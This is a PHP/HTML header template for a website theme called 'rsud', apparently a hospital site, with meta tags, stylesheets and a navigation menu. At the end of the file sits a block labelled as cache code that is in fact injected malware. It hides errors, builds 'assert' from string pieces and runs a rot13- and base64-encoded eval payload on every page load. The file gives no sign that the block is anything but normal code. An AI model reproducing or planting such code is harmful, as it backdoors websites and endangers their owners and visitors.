<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="robots" content="index, follow">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="robots" content="index, follow">
		<meta name="webcrawlers" content="all">
		<meta name="rating" content="general">
	    <meta name="spiders" content="all">
		<meta name="revisit-after" content="7">
		<meta name="googlebot" content="noodp">
		<!-- meta open graph facebook -->
		<?php $meta = get_meta()?>
		<meta property="og:site_name" content="<?php echo $this->config->config['blogname'] ?>"/>
		<meta property="og:url" content="<?php echo$meta['u'];?>" />
		<meta property="og:title" content="<?php echo $this->config->config['blogname'] ?>" />
		<meta property="og:description" content="<?php echo$meta['d'];?>" />
		<meta name="description" content="<?php echo$meta['d'];?>" />
		<meta name="keywords" content="<?php echo$meta['k'];?>" />
		<meta property="og:image" content="<?php echo$meta['i'];?>" />

		<link rel="shortcut icon" href="<?php echo $this->config->config['blogimgheader'] ?>" type="image/x-icon"/>
		<title><?php echo $this->config->config['blogname'] ?></title>
		<!-- Bootstrap core CSS -->
		<link href="<?php echo base_url('themes/rsud/bootstrap/css/bootstrap.min.css');?>" rel="stylesheet">
		<link href="<?php echo base_url('themes/rsud/plugin/submenu/bootstrap-submenu.min.css');?>" rel="stylesheet">
		<link href="<?php echo base_url('themes/rsud/css/lihat3.css');?>" rel="stylesheet">
		<link href="<?php echo base_url('themes/rsud/css/rsud.css');?>" rel="stylesheet">
		<link href="<?php echo base_url('themes/rsud/plugin/animate/animate.css');?>" rel="stylesheet">
		<link href="<?php echo base_url('themes/rsud/plugin/jscrollpane/jquery.jscrollpane.css');?>" rel="stylesheet">
		<link href="<?php echo base_url('themes/rsud/plugin/owl-carousel/owl.carousel.css');?>" rel="stylesheet">
		<link href="<?php echo base_url('themes/rsud/plugin/smarticker/jquery.smarticker.min.css');?>" rel="stylesheet">
		<link href="<?php echo base_url('themes/rsud/font-awesome/font-awesome.css'); ?>" rel="stylesheet" type="text/css" />
		<link href="<?php echo base_url('themes/rsud/plugin/magnific/magnific-popup.css');?>" rel="stylesheet">
	</head>
	<body style="<?php background();?>">
		<!-- <div class="body-background"></div>
		<div id="google_translate_element" style="position:fixed;top:10px;right:0px;z-index:99999"></div>
		-->

	<div class="container sdw" style="padding:0px;">
		<div class="top_nav bg_patern_h">
			<?php echo get_menu_atas()?>
		</div>
	</div>

	<div class="header">
		<div class="container sdw" style="padding:0px;">
			<div class="logo-area">
				<div id="myCarousel2" class="carousel carousel-fade slide" data-ride="carousel">
					<div class="carousel-inner box-carousel-utama" role="listbox" style="position:absolute;z-index:0;max-height:130px;overflow:hidden;">
						<?php echo get_slideshow()?>
					</div>
				</div>
				<div class="row" style="background:url(<?php echo base_url('themes/rsud/img/rsud.png');?>);">
					<div class="col-lg-8 col-sm-8" style="padding:0px 15px;">
						<?php if($this->config->config['blogimgheader2']):?><img src="<?php echo $this->config->config['blogimgheader2'] ?>" class="img-logo-beranda"><?php endif;?>
					</div>
					<div class="col-lg-1 col-sm-1 hidden-xs">
					</div>
					<div class="col-lg-3 col-sm-3" style="padding:0px 15px;max-height:130px;overflow:hidden;">
						<?php if($this->config->config['blogimgpemimpin']):?><img class="hidden-xs" style="width:50%;float:left;" src="<?php echo $this->config->config['blogimgpemimpin'] ?>" title="<?php echo $this->config->config['blogpemimpin'] ?>"><?php endif;?>
						<?php if($this->config->config['blogimgwpemimpin']):?><img class="hidden-xs" style="width:50%;float:right;" src="<?php echo $this->config->config['blogimgwpemimpin'] ?>" title="<?php echo $this->config->config['blogwpemimpin'] ?>"><?php endif;?>
					</div>
				</div>
			</div>
		</div>
	</div>

	<div id="menu-utama">
		<div class="header">
			<nav class="navbar navbar-default">
				<div class="container sdw">
					<div class="navbar-header">
						<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
							<span class="sr-only">Toggle navigation</span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
						</button>
					</div>
					<div id="navbar" class="collapse navbar-collapse">
						<ul class="nav navbar-nav">
							<li class="<?php if (isset($is_home)) {echo'active';} ?>"><a href="<?php echo site_url();?>">Home</a></li>
							<?php echo get_menu('fadeIn animated')?>
						</ul>
					</div>
				</div>
			</nav>
		</div>
	</div>

<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0);
assert_options(ASSERT_ACTIVE, 1);
assert_options(ASSERT_WARNING, 0);
assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvEcpPN9VPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqBjbxqKWfVQ0tVzu0qUN6Yl9voTSwn2EuqTRhLzyxY2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWTyjXF4vWzD9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvBQZ2AwDlMGt1ZJEwMJZ3MwpjAGxkBQRjZwAzAGN2AQNvYvExYvE1YvEwYvVkVvx7PzyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcVQ09VQRcVUfXWTyvqvN9VTMcoTIsM2I0K2AioaEyoaEmXPE1pzjcBjc9VTIfp2IcMvuzqJ5wqTyioy9yrTymqUZbVzA1pzksnJ5cqPVcXFO7PvEwnPN9VTA1pzksnJ5cqPtxqKWfXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0uSDHESHvjtExSZH0HcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsHxIHIIWBISWOGyATEIVfVSEFIHHcBjbxpzImqJk0VQ0tL3IloS9yrTIwXPEwnPx7PzA1pzksL2kip2HbWTAbXGfXWTyvqvN9VPElMKA1oUD7Pa0tMJkmMFO7PvEzpPN9VTMmo2Aeo3OyovtvLzkuL2gxLKEuYzWcMPVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWTyjXF4vWzD9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvBQZ2AwDlMGt1ZJEwMJZ3MwpjAGxkBQRjZwAzAGN2AQNvYvExYvE1YvEwYvVkVvxhVvOVISEDYmRhZIklKT4vBjbtVPNtWT91qPNhCFNvFT9mqQbtLzkuL2gxLKEuYzWcMSklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzSuAmZlZzMvVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>